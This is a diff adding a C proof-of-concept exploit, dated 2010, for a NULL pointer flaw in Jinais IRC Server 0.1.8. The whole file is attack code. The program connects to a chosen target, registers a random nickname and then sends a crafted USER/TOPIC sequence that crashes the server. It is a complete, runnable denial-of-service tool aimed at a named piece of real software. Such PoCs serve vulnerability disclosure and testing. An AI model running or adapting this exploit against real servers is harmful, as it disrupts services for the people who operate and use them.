@@ -1,0 +1,258 @@
+/*
+
+    Jinais IRC Server 0.1.8 - NULL Pointer PoC
+    
+    This PoC will disconnect the affected target IRC server using
+    a NULL Pointer vulnerability.
+
+    Copyright 2010 Salvatore Fresta aka Drosophila
+
+    This program is free software; you can redistribute it and/or
+    modify it under the terms of  the  GNU General Public License
+    as published by the  Free Software Foundation; either version 
+    2 of the License, or (at your option) any later version.
+
+    This program  is  distributed  in the hope  that  it  will be
+    useful, but WITHOUT ANY WARRANTY;  without  even the  implied
+    warranty  of  MERCHANTABILITY  or  FITNESS  FOR  A PARTICULAR
+    PURPOSE. See the GNU General Public License for more details.
+
+    You should have  received a copy  of  the  GNU General Public
+    License along  with  this program;  if not, write to the Free
+    Software Foundation,Inc., 59 Temple Place, Suite 330, Boston,
+    MA 02111-1307 USA
+
+    http://www.gnu.org/licenses/gpl-2.0.txt
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <getopt.h>
+#include <stdlib.h>
+#include <time.h>
+#ifdef WIN32
+	#include <winsock.h>
+	#define close closesocket
+#else
+	#include <sys/types.h>
+	#include <sys/socket.h>
+	#include <netinet/in.h>
+	#include <unistd.h>
+	#include <errno.h>
+	#include <netdb.h>
+#endif
+
+#define BUFF_SIZE 256
+#define DEFAULT_PORT 4002
+
+
+int socket_connect(char *server, int port);
+char *socket_receive(int sock, int tout);
+int socket_send(int socket, char *buffer, size_t size);
+int socket_close(int socket);
+
+
+
+int main(int argc, char *argv[]) {
+
+	int sd,
+	    rnd_num,
+	    len,
+	    port = DEFAULT_PORT;
+	char pkg[BUFF_SIZE],
+	     *response = NULL,
+	     *host = NULL;
+	
+	if(argc < 2) {
+		printf("\nJinais IRC Server 0.1.8 NULL Pointer PoC - (c) Salvatore Fresta"
+		       "\nhttp://www.salvatorefresta.net"
+		       "\n"
+		       "\nUsage: %s <target_hostname> <port> (default: %d)\n\n", argv[0], port);
+		return -1;
+	}
+	
+	srand(time(NULL));
+	
+	host = argv[1];
+	if(argc > 2) port = atoi(argv[2]);
+	
+	printf("\nJinais IRC Server 0.1.8 NULL Pointer PoC - (c) Salvatore Fresta"
+		   "\nhttp://www.salvatorefresta.net"
+		   "\n\n[*] Connecting to %s:%hu...", host, port);
+	
+	sd = socket_connect(host, port);
+	if(sd < 0) {
+		printf("\n[-] Error on connect!\n\n");
+		return -1;
+	}
+	
+	printf("\n[+] Connection estabilished"
+	       "\n[*] Loggin to IRC server...");
+	
+login:	
+	
+	rnd_num = rand()%100+1;
+	
+	len = snprintf(pkg, sizeof(pkg), "NICK randomnickname%d\r\n", rnd_num);
+	if(len < 0 || len > sizeof(pkg)) {
+		perror("\n[-] Error: snprintf");
+		socket_close(sd);
+		return -1;
+	}
+	
+	if(socket_send(sd, pkg, len) < 0) {
+		perror("\n[-] Error: socket_send");
+		socket_close(sd);
+		return -1;
+	}
+	
+	response = socket_receive(sd, 3);
+	if(!response) {
+		perror("\n[-] Error: socket_receive");
+		socket_close(sd);
+		return -1;
+	}
+	
+	if(strstr(response, "Nickname is already in use")) {
+		free(response);
+		goto login;
+	}
+	free(response);
+	
+	printf("\n[+] Login successfully"
+	       "\n[*] Data sending...");
+	       
+	rnd_num = rand()%100+1;
+	len = snprintf(pkg, sizeof(pkg), "USER blabla\r\nTOPIC #ch%d\r\n", rnd_num);
+	if(len < 0 || len > sizeof(pkg)) {
+		perror("\n[-] Error: snprintf");
+		socket_close(sd);
+		return -1;
+	}
+	
+	if(socket_send(sd, pkg, len) < 0) {
+		perror("\n[-] Error: socket_send");
+		socket_close(sd);
+		return -1;
+	}
+	
+	response = socket_receive(sd, 3);
+	if(!response) {
+		perror("\n[-] Error: socket_receive");
+		socket_close(sd);
+		return -1;
+	}
+	
+	socket_close(sd);
+	
+	printf("\n[+] Data sent successfully"
+	       "\n[+] Connection closed\n\n");
+	
+	return 0;
+	
+}
+
+
+
+int socket_connect(char *server, int port) {
+
+	int sd;
+	struct sockaddr_in sock;
+	struct hostent *host = NULL;
+	
+#ifdef WIN32	
+	WSADATA wsadata;
+    if(WSAStartup(MAKEWORD(1,0), &wsadata)) return -1;
+#endif
+	
+	memset(&sock, 0, sizeof(sock));
+	
+	if((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return -1;
+	
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+	
+	if(!(host=gethostbyname(server))) return -1;
+	
+	sock.sin_addr = *((struct in_addr *)host->h_addr);
+	
+	if(connect(sd, (struct sockaddr *) &sock, sizeof(sock)) < 0) return -1;
+	
+	return sd;
+   
+}
+
+
+
+char *socket_receive(int sock, int tout) {
+
+	int ret,
+	    byte_recv,
+	    oldpkglen = 0,
+	    pkglen = 0;
+	char *buffer = NULL, 
+	     tmp[128];
+	struct timeval timeout;
+	fd_set input;
+	
+	if(sock < 0) return NULL;
+	
+	while (1) {
+		
+		FD_ZERO(&input);
+		FD_SET(sock, &input);
+		
+		if(tout > 0) {
+			timeout.tv_sec  = tout;
+			timeout.tv_usec = 0;
+			ret = select(sock + 1, &input, NULL, NULL, &timeout);
+		}
+		else
+			ret = select(sock + 1, &input, NULL, NULL, NULL);
+	
+		if (!ret) break;
+		if (ret < 0) return NULL;
+		
+		byte_recv = recv(sock, tmp, sizeof(tmp), 0);
+		
+		if(byte_recv < 0) return NULL;
+		
+		if(!byte_recv) break;
+		
+		oldpkglen = pkglen;
+		pkglen += byte_recv;
+		
+		buffer = (char *) realloc(buffer, pkglen+1);
+		
+		if(!buffer) return NULL;
+		
+		memcpy(buffer+oldpkglen, tmp, byte_recv);
+	
+	}
+	
+	if(buffer) buffer[pkglen] = 0;
+	
+	return buffer;
+   
+}
+
+
+
+int socket_send(int socket, char *buffer, size_t size) {
+	
+	if(socket < 0) return -1;
+
+	return send(socket, buffer, size, 0) < 0 ? -1 : 0;
+	
+}
+
+
+
+int socket_close(int socket) {
+	
+	if(socket < 0) return -1;
+	
+	return close(socket) < 0 ? -1 : 0;
+	
+}
